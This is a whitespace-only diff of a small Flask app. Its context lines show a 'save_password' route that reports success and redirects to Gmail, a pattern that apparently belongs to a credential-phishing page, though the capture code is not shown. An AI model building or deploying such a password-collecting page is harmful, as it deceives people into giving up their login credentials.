@@ -2,9 +2,11 @@ from flask import Flask, request, jsonify, render_template, send_from_directory,
 
 app = Flask(__name__, static_url_path='')
 
+
 @app.route('/static/<path:path>')
 def send_static(path):
     return send_from_directory('static', path)
+
 
 @app.route('/')
 def index():
@@ -24,7 +26,6 @@ def save_password():
         "status": "success",
         "redirect_to": "https://mail.google.com/"
     })
-
 
 
 if __name__ == '__main__':
